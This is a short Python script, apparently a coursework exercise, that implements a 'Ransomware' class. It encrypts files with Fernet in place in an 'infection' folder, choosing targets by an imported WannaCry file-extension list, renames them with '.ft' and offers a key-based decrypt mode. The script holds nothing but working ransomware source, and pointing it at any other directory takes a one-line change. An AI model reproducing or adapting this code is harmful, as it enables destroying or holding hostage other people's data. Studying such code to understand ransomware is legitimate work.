import os
import glob
import argparse
from cryptography.fernet import Fernet
from wannacry_file_extensions import file_extensions


def main():
    dir = "infection"

    args = parse_args()

    if args["generate_test_files"]:
        generate_test_files(dir, file_extensions)
    else:
        key = args["reverse"] if args["reverse"] else Fernet.generate_key()

        ransomware = Ransomware(dir, key, args["reverse"])

        if args["reverse"]:
            ransomware.dencrypt_files()
        else:
            print(f"This is your key: {key} \nKeep it somewhere safe if you want to decrypt your files")
            ransomware.encrypt_files()

class Ransomware():
    def __init__(self, dir, key, reverse) -> None:
        self.key = key
        try:
            self.fernet = Fernet(self.key)
        except ValueError as e:
            print(f"Invalid key: {e}")
        self.files = self.get_file_names(dir, reverse)

    def encrypt_files(self):
        for file in self.files:
            with open(file, "rb+") as f:
                data = self.fernet.encrypt(f.read())
                f.seek(0)
                f.write(data)
                f.truncate()
            os.rename(file, file + ".ft")

    def dencrypt_files(self):
        print(self.files)
        for file in self.files:
            with open(file, "rb+") as f:
                data = self.fernet.decrypt(f.read())
                print("data: ", data)
                f.seek(0)
                f.write(data)
                f.truncate()
            os.rename(file, os.path.splitext(file)[0])

    def get_file_names(self, dir, reverse):
        if reverse:
            return glob.glob(f"{dir}/*.ft")

        files = []
        for ext in file_extensions:
            files.extend(glob.glob(f"{dir}/*.{ext}"))
        return files

def generate_test_files(dir, extensions):
    os.makedirs(os.path.dirname(dir + "/"), exist_ok=True)
    for ext in extensions:
        path = f"{dir}/encrypt_me_daddy.{ext}"
        with open(path, 'w+') as f: 
            f.write("TOP SECRET")

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
            '-gtf', '--generate-test-files', default=False,
            action=argparse.BooleanOptionalAction,
            help='Generate a file for each valid file extensions')

    parser.add_argument("--reverse", help="This option followed by the key will decrypt de files")

    args = parser.parse_args()
    return vars(args)

if __name__ == "__main__":
    main()
